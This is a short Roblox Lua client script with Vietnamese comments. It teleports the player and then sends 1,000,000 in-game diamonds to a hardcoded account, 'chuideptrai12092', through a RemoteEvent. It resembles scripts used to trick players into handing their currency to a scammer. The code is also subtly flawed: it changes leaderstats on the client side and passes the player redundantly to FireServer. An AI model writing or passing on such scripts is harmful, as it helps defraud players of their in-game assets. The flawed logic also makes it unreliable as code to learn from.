local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Lấy người chơi cục bộ và các đối tượng liên quan
local player = Players.LocalPlayer
local leaderstats = player.leaderstats
local diamonds = leaderstats["\240\159\146\142 Diamonds"].Value

-- Tọa độ teleport
local teleportCoordinates = Vector3.new(143.34673614500, 23.6020991104125977, -349.0367736816406)

-- Chức năng gửi kim cương
local function sendDiamonds(amount, recipient)
    if diamonds >= amount then
        leaderstats["\240\159\146\142 Diamonds"].Value = diamonds - amount
        print("Đã gửi " .. amount .. " kim cương cho " .. recipient)
        
        -- Fire the RemoteEvent to send diamonds
        local SendDiamondsEvent = ReplicatedStorage:FindFirstChild("SendDiamondsEvent")
        if SendDiamondsEvent then
            SendDiamondsEvent:FireServer(player, recipient, amount)
        else
            warn("Không tìm thấy RemoteEvent 'SendDiamondsEvent'!")
        end
    else
        warn("Không đủ kim cương để gửi!")
    end
end

-- Teleport đến tọa độ đã cho
player.Character.HumanoidRootPart.CFrame = CFrame.new(teleportCoordinates)

-- Gửi 1 triệu kim cương cho người chơi chuideptrai12092
local amountToSend = 1000000
local recipient = "chuideptrai12092"
sendDiamonds(amountToSend, recipient)
